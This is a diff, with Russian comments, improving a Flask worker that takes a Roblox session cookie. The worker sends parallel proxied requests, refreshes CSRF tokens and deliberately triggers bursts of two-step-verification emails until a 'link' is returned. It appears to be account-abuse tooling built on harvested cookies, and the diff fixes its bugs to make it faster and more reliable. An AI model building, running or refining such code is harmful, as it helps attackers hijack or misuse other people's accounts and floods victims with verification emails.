@@ -18,14 +18,15 @@ from flask import Flask, request, jsonify
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 
 try:
-    import socks  # noqa: F401
+    import socks  # noqa: F401 — требует requests[socks] в requirements.txt
 except ImportError:
-    import subprocess, sys
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests[socks]", "-q"])
+    logging.warning("socks не установлен — SOCKS-прокси работать не будут. Добавьте requests[socks] в requirements.txt")
 
 app = Flask(__name__)
 
-WORKER_SECRET = os.environ.get("WORKER_SECRET", "mysecret")
+WORKER_SECRET = os.environ.get("WORKER_SECRET")
+if not WORKER_SECRET:
+    raise RuntimeError("WORKER_SECRET environment variable must be set")
 
 _RAW_PROXIES = os.environ.get("PROXY_LIST", "")
 _PROXY_POOL: list[str] = [p.strip() for p in _RAW_PROXIES.split(",") if p.strip()]
@@ -102,8 +103,13 @@ def _decode_challenge_meta(challenge_meta_b64: str) -> dict:
     if not challenge_meta_b64:
         return {}
     try:
-        # Roblox иногда шлёт URL-safe base64 или обычный — пробуем оба
-        for b64 in (challenge_meta_b64, challenge_meta_b64.replace("-", "+").replace("_", "/")):
+        # Roblox иногда шлёт URL-safe base64 или обычный — пробуем оба,
+        # но не дублируем итерацию если строка не содержит - или _  (БАГ-19)
+        converted = challenge_meta_b64.replace("-", "+").replace("_", "/")
+        variants = [challenge_meta_b64]
+        if converted != challenge_meta_b64:
+            variants.append(converted)
+        for b64 in variants:
             try:
                 padded = b64 + "=" * (-len(b64) % 4)
                 decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
@@ -203,10 +209,10 @@ def _trigger_2fa_email_send(
 
         send_url = f"https://twostepverification.roblox.com/v1/users/{uid}/challenges/email/send-code"
         payload = {"actionType": action_type, "challengeId": inner_challenge_id}
-        headers = _base_headers(csrf)
+        s.headers.update(_base_headers(csrf))
 
         logging.info("Отправка email 2FA: uid=%s, challengeId=%s, actionType=%s", uid, inner_challenge_id, action_type)
-        r_send = s.post(send_url, json=payload, headers=headers, timeout=8)
+        r_send = s.post(send_url, json=payload, timeout=8)
         success = r_send.status_code in (200, 204)
         logging.info("Email 2FA результат: status=%s, ok=%s, body=%s", r_send.status_code, success, r_send.text[:100])
         return success
@@ -243,10 +249,13 @@ def _one_request(cookie: str, csrf: str, user_id: int | None, trigger_email: boo
         cid   = r.headers.get("rblx-challenge-id", "")
         cmeta = r.headers.get("rblx-challenge-metadata", "")
 
+        # При 403+challenge Roblox всегда возвращает свежий CSRF — берём его
+        effective_csrf = new_csrf or csrf
+
         email_sent = False
         if r.status_code == 403 and ctype and trigger_email and cid:
             # Передаём cookie отдельно чтобы _trigger мог создать свою сессию
-            email_sent = _trigger_2fa_email_send(cookie, user_id, new_csrf or csrf, cid, cmeta)
+            email_sent = _trigger_2fa_email_send(cookie, user_id, effective_csrf, cid, cmeta)
 
         return {
             "status": r.status_code,
@@ -255,7 +264,7 @@ def _one_request(cookie: str, csrf: str, user_id: int | None, trigger_email: boo
             "challengeId": cid,
             "challengeMeta": cmeta,
             "emailSent": email_sent,
-            "newCsrf": new_csrf,
+            "newCsrf": effective_csrf,
             "body": r.text[:200],
         }
     except Exception as e:
@@ -296,7 +305,11 @@ def run_parallel_api_for_duration(
         user_id, csrf[:8] if csrf else "None", workers, target_emails, int(duration_sec),
     )
 
-    with _futures.ThreadPoolExecutor(max_workers=workers) as ex:
+    found_link = None
+    # БАГ-16: не используем with-блок — он ждёт все потоки при выходе (shutdown wait=True).
+    # Создаём executor вручную и вызываем shutdown(wait=False, cancel_futures=True) при раннем выходе.
+    ex = _futures.ThreadPoolExecutor(max_workers=workers)
+    try:
         while total < MAX_TOTAL_REQUESTS and (time.time() - start) < duration_sec:
             now = time.time()
 
@@ -314,20 +327,25 @@ def run_parallel_api_for_duration(
             results = [f.result() for f in _futures.as_completed(futs)]
             total += len(results)
 
+            # БАГ-C: обрабатываем всю статистику батча ДО break,
+            # иначе challenges_in_wave и emails_sent_total занижены при found_link
             for r in results:
-                if r.get("link"):
+                if r.get("link") and not found_link:
                     logging.info("УСПЕХ! Ссылка получена после %d запросов: %s", total, r["link"])
-                    return r["link"]
+                    found_link = r["link"]
                 if r.get("status") == 403 and r.get("challengeType"):
                     challenges_in_wave += 1
                 if r.get("emailSent"):
                     emails_sent_total += 1
 
-            # Обновляем CSRF из любого ответа
-            for r in results:
-                if r.get("newCsrf"):
-                    csrf = r["newCsrf"]
-                    break
+            if found_link:
+                break
+
+            # БАГ-17: обновляем CSRF один раз — сначала из ответов батча,
+            # только если там нет — делаем сетевой запрос.
+            fresh_csrf = next((r["newCsrf"] for r in results if r.get("newCsrf")), None)
+            if fresh_csrf:
+                csrf = fresh_csrf
 
             has_challenge = any(r.get("challengeType") for r in results if r["status"] == 403)
             has_plain_403 = any(not r.get("challengeType") for r in results if r["status"] == 403)
@@ -342,12 +360,26 @@ def run_parallel_api_for_duration(
 
             if has_plain_403 and not has_challenge:
                 logging.warning("plain 403 без challenge — CSRF мог протухнуть, обновляем")
-                csrf = None
+                if fresh_csrf:
+                    logging.info("CSRF обновлён из ответа батча: %s…", csrf[:8])
+                else:
+                    # Свежего CSRF в батче не было — перезапрашиваем напрямую
+                    _, new_tok = _get_user_id_and_csrf(cookie)
+                    if new_tok and not new_tok.startswith("__LINK__:"):
+                        csrf = new_tok
+                        logging.info("CSRF перезапрошен: %s…", csrf[:8])
 
             if challenges_in_wave < target_emails:
                 time.sleep(PAUSE_429 if has_429 else PAUSE_BURST)
             else:
                 time.sleep(PAUSE_429 if has_429 else PAUSE_POLL)
+
+    finally:
+        # cancel_futures=True (Python 3.9+) — не ждём незапущенные задачи
+        ex.shutdown(wait=False, cancel_futures=True)
+
+    if found_link:
+        return found_link
 
     logging.error("Время вышло: %ds, всего запросов: %d, email отправлено: %d", int(duration_sec), total, emails_sent_total)
     return None
@@ -355,6 +387,10 @@ def run_parallel_api_for_duration(
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"status": "ok", "file": "worker.py", "deadline_sec": DEADLINE})
+
+# БАГ-18: ограничиваем параллельные /get-link чтобы не исчерпать потоки Flask
+_MAX_CONCURRENT = int(os.environ.get("MAX_CONCURRENT_REQUESTS", 3))
+_request_sem = _threading.Semaphore(_MAX_CONCURRENT)
 
 @app.route("/get-link", methods=["POST"])
 def get_link():
@@ -367,12 +403,19 @@ def get_link():
     if not cookie:
         return jsonify({"error": "cookie required"}), 400
 
-    link = run_parallel_api_for_duration(
-        cookie,
-        workers=BATCH_SIZE,
-        target_emails=EMAIL_BURST_TARGET,
-        duration_sec=DEADLINE,
-    )
+    if not _request_sem.acquire(blocking=False):
+        return jsonify({"error": "worker busy, try another worker"}), 503
+
+    try:
+        link = run_parallel_api_for_duration(
+            cookie,
+            workers=BATCH_SIZE,
+            target_emails=EMAIL_BURST_TARGET,
+            duration_sec=DEADLINE,
+        )
+    finally:
+        _request_sem.release()
+
     if link:
         return jsonify({"link": link})
     return jsonify({"error": "failed to get link within deadline"}), 500
